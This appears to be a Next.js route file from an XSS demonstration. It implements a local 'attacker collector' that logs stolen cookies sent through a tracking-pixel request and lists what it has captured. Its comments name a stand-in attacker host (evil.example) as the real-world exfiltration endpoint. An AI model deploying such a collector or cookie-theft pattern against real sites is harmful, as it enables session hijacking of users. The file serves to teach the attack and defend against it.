// Simulated ATTACKER collector. In a real attack this lives on the attacker's
// own server (e.g. https://evil.example/?c=...). Here it runs locally so the
// stored-XSS payload has somewhere to send the stolen cookie WITHOUT any real
// network egress.
//
// - GET /api/steal?c=<cookie>  -> records the captured value, returns a 1x1 gif
// - GET /api/steal             -> returns everything captured so far (for the demo)
import { NextRequest, NextResponse } from "next/server";

type Capture = { value: string; at: string; ua: string | null };

// In-memory loot bag. Survives until the dev server restarts.
const g = globalThis as unknown as { __stolen?: Capture[] };
g.__stolen ??= [];

// 1x1 transparent GIF so <img src="/api/steal?c=..."> loads silently.
const PIXEL = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64"
);

export async function GET(req: NextRequest) {
  const c = req.nextUrl.searchParams.get("c");

  if (c === null) {
    return NextResponse.json({ stolen: g.__stolen });
  }

  const capture: Capture = {
    value: c,
    at: new Date().toISOString(),
    ua: req.headers.get("user-agent"),
  };
  g.__stolen!.push(capture);
  console.log("[steal] 🪝 captured cookie:", c);

  return new NextResponse(PIXEL, {
    headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" },
  });
}
